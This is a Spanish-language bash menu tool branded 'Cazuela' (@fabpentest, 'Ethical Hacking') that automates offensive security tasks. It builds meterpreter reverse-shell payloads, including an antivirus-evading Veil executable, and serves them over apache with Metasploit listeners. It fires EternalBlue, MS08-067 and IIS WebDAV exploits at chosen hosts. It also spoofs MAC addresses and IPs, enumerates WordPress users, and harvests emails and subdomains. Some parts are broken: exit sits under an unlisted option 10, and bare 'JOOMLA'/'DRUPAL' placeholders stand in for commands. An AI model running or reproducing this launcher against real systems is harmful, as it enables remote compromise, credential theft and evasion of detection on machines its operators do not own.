#!/bin/bash
clear
while :
do          
echo -e "	   						               
\e[1;37m    ██████╗ █████╗ ███████╗██╗   ██╗███████╗██╗      █████╗    	
\e[1;37m   ██╔════╝██╔══██╗╚══███╔╝██║   ██║██╔════╝██║     ██╔══██╗
\e[1;37m   ██║     ███████║  ███╔╝ ██║   ██║█████╗  ██║     ███████║
\e[1;37m   ██║     ██╔══██║ ███╔╝  ██║   ██║██╔══╝  ██║     ██╔══██║
\e[1;37m   ╚██████╗██║  ██║███████╗╚██████╔╝███████╗███████╗██║  ██║ 
\e[1;37m    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝ 
                          			              
\e[1;37m        ) (  )  (           	              	
\e[1;37m        ( ) (   )           
\e[0;31m      <___________>       
\e[0;31m       ___________   	 
\e[0;31m     (|           |) :::::::::\e[0;31m[ Public Release ]\e[0;31m::::::::
\e[0;31m      |           |  :::::::::::\e[0;31m[ @fabpentest ]\e[0;31m::::::::::             			         
\e[0;31m      
      |           |  :::::::::\e[0;31m[ Ethical Hacking ]\e[0;31m::::::: 
\e[0;31m       \_________/   :::::::::::::\e[0;31m[ v1.0 ]\e[0;31m::::::::::::::"    
echo   
echo -e "   \e[1;37mEscoja una opcion "
#echo	
echo -e "   \e[0;31m[1]\e[0m \e[1;37m Reversing\e[0m "
echo -e "   \e[0;31m[2]\e[0m \e[1;37m Anonimato en la red\e[0m"
#echo
echo -e "   \e[0;31m[3]\e[0m \e[1;37m Scan Exploit\e[0m"
echo -e "   \e[0;31m[4]\e[0m \e[1;37m Attack Exploits\e[0m"
#echo 
#echo
echo -e "   \e[0;31m[5]\e[0m \e[1;37m Attack Wordpress, Joomla, Drupal\e[0m"
echo -e "   \e[0;31m[6]\e[0m \e[1;37m Busqueda rapida \e[0m"
echo -e "   \e[0;31m[7]\e[0m \e[1;37m Investigando objetivo\e[0m"

echo -e "   \e[0;31m[8]\e[0m \e[1;37m Salir\e[0m"
echo 
echo -n -e "  \e[1;37m Seleccione una opcion [1 - 8]"
echo
read opcion
case $opcion in

#############################################################################################################

1) echo "  Reversing :";
echo "Escoje la plataforma:"
select lwpnv in "Linux" "Windows" "PHP" "Netcat" "Volver"; do
case $lwpnv in

Linux )
echo -e "  > Ingresa el nombre del payload, ejemplo : \e[1;33mKernel \e[0m";
read nombre
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p') LPORT=443 -f elf > /var/www/html/$nombre.elf
service apache2 start
gnome-terminal -- msfconsole -x "use multi/handler;\
set payload linux/x86/meterpreter/reverse_tcp;\
set lhost $(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p');\
set lport 443;\
run -z;\
exit"
break;;

Windows )
echo -e "  > Ingresa el nombre del payload, ejemplo : \e[1;33mwinrar \e[0m";
read nombre
veil -t Evasion -p 37 --msfvenom python/shellcode_inject/arc_encrypt --ip $(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p') --port 443 -o $nombre
service apache2 start
mv /var/lib/veil/output/compiled/$nombre.exe /var/www/html/
gnome-terminal -- msfconsole -x "use multi/handler;\
set payload windows/meterpreter/reverse_tcp;\
set lhost $(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p');\
set lport 443;\
run -y;\
exit"
break;;

PHP )
echo -e "  > Ingresa un puerto a utilizar, ejemplo : \e[1;33m4444 \e[0m";
read puerto
gnome-terminal -- msfconsole -x "use multi/handler;\
set payload php/meterpreter/reverse_tcp;\
set lhost $(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p');\
set lport $puerto;\
run -y;\
exit"
break;;

Netcat )
echo -e "  > Ingresa un puerto a utilizar, ejemplo : \e[1;33m4444 \e[0m";
read puerto
gnome-terminal -- nc -n -v -l -p $puerto
break;;

Volver ) 
break;;

*) echo "$ No es una opcion válida.";
echo "Presiona una ENTER para continuar...";
read;;
    esac
done;;

#############################################################################################################

2) echo -e "\e[0;31m  ###  ASEGURATE DE NO ESTAR CONECTADO A INTERNET PARA REALIZAR EL CAMBIO  ###\e[0m";
echo "Anonimato en la red"
select osa in "Cambiar-Mac.Manual" "Cambiar-Mac.Automatica" "Cambiar-IP" "Volver"; do
case $osa in

Cambiar-Mac.Manual ) 
echo -e "  > Ingresa tu nueva direccion mac + tu interface, ejemplo : \e[1;33m44:06:AB:C8:FF:67 eth0/wlan0\e[0m";
read interface mac
sudo macchanger -m $mac $interface
echo -e "  > \e[1;33Nueva Direccion Mac\e[0m";
sudo macchanger -s $interface;; 

Cambiar-Mac.Automatica ) 
echo -e "  > Ingresa la interface para el cambio de direccion mac, ejemplo : \e[1;33meth0\e[0m";
read interface
sudo macchanger $interface -r 
echo -e "  > \e[1;33Nueva Direccion Mac\e[0m";
sudo macchanger -s $interface;; 

Cambiar-IP ) 
echo -e " \e[1;33mTu direccion ip es la siguiente \e[0m";
anonsurf myip
echo -e " \e[1;33mCambiando IP \e[0m";
anonsurf start 
anonsurf start
echo -e " \e[1;33mNueva direccion IP \e[0m";
anonsurf myip
echo;;


Volver ) 
break;;

*) echo "$ No es una opcion válida.";
echo "Presiona una ENTER para continuar...";
read;;
    esac
done;;

#############################################################################################################

3) echo -e "\e[0;31m  ###  Scan Exploit  ###\e[0m:";
echo "¿Que deseas escanear?"
select osav in "Netapi" "Ethernalblue" "IIS6.0ScStoragePathFromUrl" "Volver"; do
case $osav in

Netapi ) 
echo -e "  > Ingresa la ruta del archivo con los host, ejemplo: \e[1;33m/home/archivo.txt\e[0m";
read Netapi
nmap --script smb-vuln-ms08-067.nse -iL $Netapi >> /root/HostScan_Netapi.txt
echo 
echo "-----------------------------------------------------------------------------------------"
echo -e "\e[1;37mINFORMACION OBTENIDA!, SE A CREADO UN ARCHIVO EN LA CARPETA /root/\e[0m"
echo "-----------------------------------------------------------------------------------------"
break;;

Ethernalblue ) 
echo -e "  > Ingresa la ruta del archivo con los host, ejemplo: \e[1;33m/home/archivo.txt\e[0m";
read Ethernalblue
nmap --script smb-vuln-ms17-010 -iL $Ethernalblue >> /root/HostScan_Ethernalblue.txt
echo 
echo "-----------------------------------------------------------------------------------------"
echo -e "\e[1;37mINFORMACION OBTENIDA!, SE A CREADO UN ARCHIVO EN LA CARPETA /root/\e[0m"
echo "-----------------------------------------------------------------------------------------"
break;;

IIS6.0ScStoragePathFromUrl ) 
echo -e "  > Ingresa la ruta del archivo con los host, ejemplo: \e[1;33m/home/archivo.txt\e[0m";
read IIS6.0ScStoragePathFromUrl
nmap --script http-iis-webdav-vuln -iL $IIS6.0ScStoragePathFromUrl >> /root/HostScan_IIS6.0ScStoragePathFromUrl.txt
echo 
echo "-----------------------------------------------------------------------------------------"
echo -e "\e[1;37mINFORMACION OBTENIDA!, SE A CREADO UN ARCHIVO EN LA CARPETA /root/\e[0m"
echo "-----------------------------------------------------------------------------------------"
break;;

Volver )
break;;

*) echo "$opc no es una opcion válida.";
echo "Presiona una ENTER para continuar...";
read;;
    esac
done;;

#############################################################################################################

4) echo -e "\e[0;31m  ### Attack exploit ###\e[0m";
echo "Exploit a ejecutar"
select neeiv in "Netapi" "EthernalblueX64" "EthernalblueX86" "IIS60ScStoragePathFromUrl" "Volver"; do
case $neeiv in

Netapi ) 
echo -e "  > Ingresa el host objetivo, ejemplo: \e[1;33m192.168.1.10\e[0m";
read netapi
gnome-terminal -- msfconsole -x "use exploit/windows/smb/ms08_067_netapi;\
set RHOSTS $netapi;\
run;\
exit"
break;;

EthernalblueX64 ) 
echo -e "  > Ingresa el host objetivo x64, ejemplo: \e[1;33m192.168.1.20\e[0m";
read objetivo 
echo
echo -e "  > Escoje del sistema objetivo, ejemplo: \e[1;33m8\e[0m";
echo 
echo " 
Id  Name
--  ----
0   Windows XP (all services pack) (x86) (x64)
1   Windows Server 2003 SP0 (x86)
2   Windows Server 2003 SP1/SP2 (x86)
3   Windows Server 2003 (x64)
4   Windows Vista (x86)
5   Windows Vista (x64)
6   Windows Server 2008 (x86) 
7   Windows Server 2008 R2 (x86) (x64)
8   Windows 7 (all services pack) (x86) (x64)"
echo
read id
echo 
gnome-terminal -- msfconsole -x "use exploit/windows/smb/eternalblue_doublepulsar;\
set PAYLOAD windows/x64/meterpreter/reverse_tcp;\
set TARGETARCHITECTURE x64;\
set PROCESSINJECT lsass.exe  ;\
set lhost $(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p');\
set RHOST $objetivo;\
set LPORT 443;\
run"
break;;

EthernalblueX86 ) 
echo -e "  > Ingresa el host objetivo, ejemplo: \e[1;33m192.168.1.20\e[0m";
read objetivo 
echo
echo -e "  > Ingresa tu ip, ejemplo: \e[1;33m192.168.1.2\e[0m";
read myip
echo
echo -e "  > Escoje el numero del sistema objetivo, ejemplo: \e[1;33m8\e[0m";
echo " 
Id  Name
--  ----
0   Windows XP (all services pack) (x86) (x64)
1   Windows Server 2003 SP0 (x86)
2   Windows Server 2003 SP1/SP2 (x86)
3   Windows Server 2003 (x64)
4   Windows Vista (x86)
5   Windows Vista (x64)
6   Windows Server 2008 (x86) 
7   Windows Server 2008 R2 (x86) (x64)
8   Windows 7 (all services pack) (x86) (x64)"
echo
read id
echo 
gnome-terminal -- msfconsole -x "use exploit/windows/smb/eternalblue_doublepulsar;\
set PAYLOAD windows/meterpreter/reverse_tcp;\
set TARGETARCHITECTURE x86;\
set PROCESSINJECT spoolsv.exe;\
set LHOST $myip;\
set lhost $(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p');\
set RHOST $objetivo;\
set LPORT 443;\
run"
break;;

IIS60ScStoragePathFromUrl ) 
echo -e "  > Ingresa el host objetivo, ejemplo: \e[1;33m192.168.1.20\e[0m";
read objetivo 
gnome-terminal -- msfconsole -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl;\
set lhost $(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p');\
set RHOST $objetivo;\
set RPORT 80;\
run"
break;;

Volver )
break;;

*) echo "$opc no es una opcion válida.";
echo "Presiona una ENTER para continuar...";
read;;
    esac
done;;

#####################################################################################################

5) echo -e "\e[0;31m  ### Attack Wordpress ###\e[0m";
echo "¿ Cual es la plataforma a escanear ?"
select osa in "Wordpress" "Joomla" "Drupal" "Volver"; do
case $osa in
Wordpress ) 
echo -e "  > Ingresa el dominio objetivo, ejemplo: \e[1;33mdominio.com\e[0m";
read objetivo
wpscan --url $objetivo --enumerate u 
break;;

Joomla ) 
echo -e "  > Ingresa el dominio objetivo, ejemplo: \e[1;33mdominio.com\e[0m";
read objetivo
JOOMLA
break;;

Drupal ) 
echo -e "  > Ingresa el dominio objetivo, ejemplo: \e[1;33mdominio.com\e[0m";
read objetivo
DRUPAL
break;;

Volver )
break;;

*) echo "$opc no es una opcion válida.";
echo "Presiona una ENTER para continuar...";
read;;
    esac
done;;

#####################################################################################################
6) echo -e "\e[0;31m  ### Busqueda rapida  ###\e[0m:";
echo -e "  > Ingresa el dominio objetivo, ejemplo: \e[1;33mdominio.com\e[0m";
read objetivo
gnome-terminal -- dirb http://$objetivo
gnome-terminal -- sparta
break;;

#####################################################################################################
7) echo "  Investigando objetivo:";
echo "¿Que informacion necesitas extraer?"
select csctv in "Cabeceras-Puertos" "Sub-Dominios" "Correos" "Todas" "Volver"; do
case $csctv in

Cabeceras-Puertos ) 
echo -e "  > Ingresa el dominio objetivo, ejemplo: \e[1;33mdominio.com\e[0m";
read objetivo
cd /root/checkweb
python automatizado.py -u $objetivo -sec -b >> /root/$objetivo.txt
nmap $objetivo >> /root/$objetivo.txt
echo "-----------------------------------------------------------------------------------------"
echo -e "\e[1;37mINFORMACION OBTENIDA!, SE A CREADO UN ARCHIVO EN LA CARPETA /root/\e[0m"
echo "-----------------------------------------------------------------------------------------"
break;;

Sub-Dominios ) 
echo -e "  > Ingresa el dominio objetivo, ejemplo: \e[1;33mdominio.com\e[0m";
read objetivo
cd /opt/Sublist3r
python sublist3r.py -d $objetivo -o /root/objetivoSubdominios$objetivo.txt
echo "-----------------------------------------------------------------------------------------"
echo -e "\e[1;37mINFORMACION OBTENIDA!, SE A CREADO UN ARCHIVO EN LA CARPETA /root/\e[0m"
echo "-----------------------------------------------------------------------------------------"
break;; 

Correos ) 
echo -e "  > Ingresa el dominio objetivo, ejemplo: \e[1;33mdominio.com\e[0m";
read objetivo
msfconsole -x "use auxiliary/gather/search_email_collector;\
set DOMAIN $objetivo;\
set OUTFILE /root/objetivoCorreosExtraidos.txt;\
run;\
exit"
theharvester -d $objetivo -l 500 -b all  >> /root/$objetivoCorreosExtraidos.txt
echo
echo "-----------------------------------------------------------------------------------------"
echo -e "\e[1;37mINFORMACION OBTENIDA!, SE A CREADO UN ARCHIVO EN LA CARPETA /root/\e[0m"
echo "-----------------------------------------------------------------------------------------"
break;;

Todas ) 
echo -e "\e[1;37mSe creara un archivo con la información /root/\e[0m"
echo -e "  > Ingresa el dominio objetivo, ejemplo: \e[1;33mdominio.com\e[0m";
read objetivo
nmap $objetivo >> /root/$objetivoSubdominios.txt
cd /opt/Sublist3r
python sublist3r.py -d $objetivo >> /root/$objetivoSubdominios.txt
theharvester -d $objetivo -l 500 -b all  >> /root/$objetivoCorreosExtraidos.txt
msfconsole -x "use auxiliary/gather/search_email_collector;\
set DOMAIN $objetivo;\
set OUTFILE /root/$objetivo.txt;\
run;\
exit"
echo 
echo "-----------------------------------------------------------------------------------------"
echo -e "\e[1;37mINFORMACION OBTENIDA!, SE A CREADO UN ARCHIVO EN LA CARPETA /root/\e[0m"
echo "-----------------------------------------------------------------------------------------"
echo;;

Volver )
break;;

*) echo "$opc no es una opcion válida.";
echo "Presiona una ENTER para continuar...";
read;;
    esac
done;;

#####################################################################################################

10) echo -e "\e[1;33mVUELVE POR TU CAZUELA !! XDD \e[0m";
echo 
exit 1;;
*) echo "$opc no es una opcion válida.";
echo "Presiona una tecla para continuar...";
read foo;;
esac
done
